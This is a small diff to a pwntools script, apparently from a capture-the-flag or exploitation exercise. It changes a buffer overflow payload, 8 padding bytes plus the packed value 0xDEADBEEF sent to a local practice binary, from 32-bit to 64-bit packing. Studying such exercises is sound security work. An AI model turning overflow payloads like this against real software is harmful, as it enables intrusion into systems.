@@ -37,7 +37,7 @@ from pwn import *
 
 target = process("./bin/ex2")
 
-payload = b"A" * 8 + p32(0xDEADBEEF)
+payload = b"A" * 8 + p64(0xDEADBEEF)
 print(payload)
 
 target.send(payload)
